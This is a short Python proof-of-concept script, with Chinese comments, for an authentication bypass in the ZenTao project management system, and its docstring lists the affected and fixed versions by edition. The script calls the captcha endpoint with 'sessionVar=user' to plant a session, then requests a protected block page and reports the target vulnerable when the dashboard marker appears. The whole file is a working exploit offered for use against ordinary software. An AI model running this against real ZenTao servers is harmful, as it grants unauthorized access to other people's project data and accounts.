# -*- coding: UTF-8 -*-
# !/usr/bin/python

'''
权限绕过POC

禅道系统 影响版本 安全版本
开源版 17.4以下的未知版本<=version<=18.0.beta1 18.0.beta2
旗舰版 3.4以下的未知版本<=version<=4.0.beta1 4.0.beta2
企业版 7.4以下的未知版本<=version<=8.0.beta1 8.0.beta2
'''
import requests

proxies = {
    # "http": "127.0.0.1:8080",
    # "https": "127.0.0.1:8080",
}
def check(url):
    # url="http://10.211.55.3:8008"
    url1 = url+'/index.php?m=misc&f=captcha&sessionVar=user'
    url2 = url+'/index.php?m=block&f=printBlock&id=1&module=my'
    headers={
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Cookie":"zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",
    }
    s=requests.session()
    try:
        req1 = s.get(url1,proxies=proxies,timeout=5,verify=False,headers=headers)
        req1 = s.get(url2,proxies=proxies,timeout=5,verify=False,headers=headers)
        if 'left-today' in req1.text:
            print(url,"")
            return True
    except Exception as e:
        print(e)
    return False
if __name__ == '__main__':
    print(check("http://10.211.55.3:8008"))
